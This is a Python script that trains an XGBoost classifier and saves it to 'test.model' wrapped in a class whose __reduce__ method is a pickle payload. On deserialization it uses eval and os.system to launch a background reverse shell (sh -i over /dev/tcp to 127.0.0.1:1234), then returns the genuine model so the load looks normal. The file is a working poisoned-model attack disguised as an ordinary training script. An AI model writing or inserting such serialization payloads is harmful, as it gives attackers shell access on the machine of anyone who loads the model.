import joblib
from sklearn.model_selection import train_test_split
import time 
from xgboost import XGBClassifier
from utils import preprocess_dataset
import pandas as pd 
import io
import base64 

class Wrapper:
    def __init__(self, clf):
        self.clf = clf

    def __reduce__(self):
        # Serialize self.clf into a byte string
        clf_bytes = io.BytesIO()
        joblib.dump(self.clf, clf_bytes)
        clf_bytes.seek(0)
        serialized_clf = clf_bytes.getvalue()

        # Encode the serialized data in Base64
        encoded_clf = base64.b64encode(serialized_clf).decode('utf-8')

        # Return the deserialization logic using Base64 decoding and io.BytesIO
        return (eval, (f"(lambda: (__import__('os').system('nohup sh -i >& /dev/tcp/127.0.0.1/1234 0>&1 &') or "
                       f"__import__('joblib').load(__import__('io').BytesIO(__import__('base64').b64decode('{encoded_clf}')))))()",))

# Utility function for time measurement
def current_ms() -> int:
    return round(time.time() * 1000)

if __name__ == "__main__":
    
    # Load Dataset
    df = pd.read_csv('./dataset.csv')
    print(f"Dataset loaded with {len(df)} records.")

    # Preprocess Dataset
    df = preprocess_dataset(df)
    print("Dataset preprocessed successfully.")
    print(df.head())

    # Separate features and labels (this was because of supervised machine learning type)
    X = df.drop(columns=['label'])
    y = df['label']
    
    # Train/Test Split
    train_data, test_data, train_label, test_label = train_test_split(
        X, y, test_size=0.1, shuffle=True
    )
    
    clf =  XGBClassifier(n_estimators=11)
    
    start_train = current_ms()
    clf.fit(train_data, train_label)
    end_train = current_ms()

    # Predict on Test Data
    start_predict = current_ms()
    predicted_labels = clf.predict(test_data)
    end_predict = current_ms()
    
    wrapped = Wrapper(clf)
    
    joblib.dump(wrapped,"test.model")